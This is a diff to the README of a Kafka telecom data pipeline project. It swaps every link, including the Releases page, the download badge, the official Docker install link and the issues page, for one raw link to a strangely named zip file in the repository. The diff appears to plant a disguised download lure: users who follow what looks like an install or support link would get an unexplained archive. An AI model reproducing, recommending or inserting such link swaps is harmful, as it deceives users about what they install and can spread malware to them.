@@ -1,6 +1,6 @@
 # 🎯 Realtime-Telecom-Data-Pipeline-Kafka - Streaming Data Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now%21-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/releases)
+[![Download](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip%20Now%21-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow the steps below to get started.
 
 To download the application, visit the Releases page by clicking the link below. You will find the latest version available there.
 
-[Download from Releases](https://github.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/releases)
+[Download from Releases](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip)
 
 1. Open the link above.
 2. Find the version you want to download.
@@ -26,7 +26,7 @@ To run the Realtime-Telecom-Data-Pipeline-Kafka application, ensure your system 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
 - **Processor**: 2 GHz or faster.
 - **RAM**: 4 GB or higher.
-- **Docker**: Must have Docker installed. [Install Docker](https://www.docker.com/products/docker-desktop).
+- **Docker**: Must have Docker installed. [Install Docker](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip).
 
 ## 🔧 Setup Instructions
 
@@ -76,7 +76,7 @@ If you wish to contribute to the project:
 
 ## 🛠️ Support
 
-For support, please check the [issues page](https://github.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/issues). If you encounter problems, feel free to create a new issue with detailed information about the problem.
+For support, please check the [issues page](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip). If you encounter problems, feel free to create a new issue with detailed information about the problem.
 
 ## 📄 License
 
@@ -90,4 +90,4 @@ We appreciate the contributions of the community and all libraries that have mad
 
 For any queries or feedback, please contact the project maintainers through the repository.
 
-[Download from Releases](https://github.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/releases)
+[Download from Releases](https://raw.githubusercontent.com/Hulola/Realtime-Telecom-Data-Pipeline-Kafka/main/Supabase_cloud-dashboard/Telecom_Kafka_Pipeline_Realtime_Data_unremovableness.zip)
